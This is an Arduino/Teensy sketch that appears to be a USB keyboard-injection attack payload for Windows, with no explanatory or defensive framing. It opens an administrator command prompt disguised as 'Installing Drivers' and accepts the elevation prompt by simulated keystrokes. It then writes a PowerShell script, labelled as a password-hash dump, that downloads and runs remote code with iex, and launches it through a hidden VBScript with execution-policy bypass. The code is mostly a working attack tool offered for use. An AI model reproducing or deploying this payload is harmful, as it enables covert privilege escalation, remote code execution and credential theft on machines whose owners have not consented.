#define TEENSY2
#ifdef TEENSY2
    #include<usb_private.h>
#endif



void setup(){
  
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Dump of Password hashes\" > %temp%\\dl.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\dl.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\dl.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\dl.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\dl.ps1");
  Keyboard.println("echo $pv = iex $wc.DownloadString(\"\") >> %temp%\\dl.ps1");

  String fn = "dl";
  String fp;
  

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dl.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dl.ps1\"),0,true >> %temp%\\dl.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dl.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}


void wait_for_drivers(int sleep)
{
bool CapsLockTrap = is_caps_on();
while(CapsLockTrap == is_caps_on())
{
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}

int ledkeys(void) {return int(keyboard_leds);}

bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}

bool cmd_admin(int reps, int millisecs)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.send_now();
delay(3000);
Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");
delay(2000);
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.send_now();
Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
Keyboard.send_now();
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(7000);
send_left_enter();
delay(4000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

bool cmd(int reps, int millisecs, char *SomeCommand)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_R);
Keyboard.send_now();

delay(500);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();

Keyboard.print(SomeCommand);
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();

delay(3000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

void make_sure_capslock_is_off(void)
{
if (is_caps_on())
{
delay(500);
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
delay(700);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(700);
}
}

void create_click_capslock_win()
{
Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");
delay(400);
Keyboard.println("wscript %temp%\\capslock.vbs");
delay(2000);
}

bool check_for_capslock_success_teensy(int reps, int millisecs)
{
unsigned int i = 0;
do
{
delay(millisecs);
if (is_caps_on())
{
make_sure_capslock_is_off();
delay(700);
return true;
}
i++;
}
while (!is_caps_on() && (i<reps));
return false;
}

void minimise_windows(void)
{
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_M);
Keyboard.send_now();
delay(300);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(300);
}

void reset_windows_desktop(int sleep)
{
delay(1000);
minimise_windows();
delay(sleep);
minimise_windows();
delay(sleep);
minimise_windows();
delay(200);
}

void send_left_enter(){
  delay(1000);
  Keyboard.set_key1(KEY_LEFT);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }


